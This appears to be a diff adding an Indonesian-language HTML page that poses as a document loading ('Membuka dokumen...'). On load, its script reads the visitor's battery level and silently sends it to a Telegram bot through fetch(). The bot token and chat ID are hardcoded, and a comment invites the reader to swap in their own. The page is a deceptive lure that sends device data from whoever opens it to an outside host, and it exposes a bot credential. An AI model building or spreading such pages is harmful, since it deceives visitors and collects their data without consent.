@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MEMBUKA DOKUMEN...</title>
+  <meta charset="UTF-8" />
+  <style>
+    body {
+      background: #fff;
+      color: #000;
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    .loader {
+      font-size: 18px;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+  </style>
+</head>
+<body>
+  <h2>📄 Membuka dokumen...</h2>
+  <p class="loader" id="batre">🔄 Sedang memeriksa baterai HP...</p>
+
+  <script>
+    navigator.getBattery().then(function(bat) {
+      const persen = Math.round(bat.level * 100);
+      const status = `🔋 BATERAI: ${persen}%`;
+
+      document.getElementById("batre").innerText = status;
+
+      // Ganti token & chat ID dengan milikmu
+      const token = "7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90";
+      const chatid = "8122699796";
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(status)}`;
+      fetch(url);
+    });
+  </script>
+</body>
+</html>
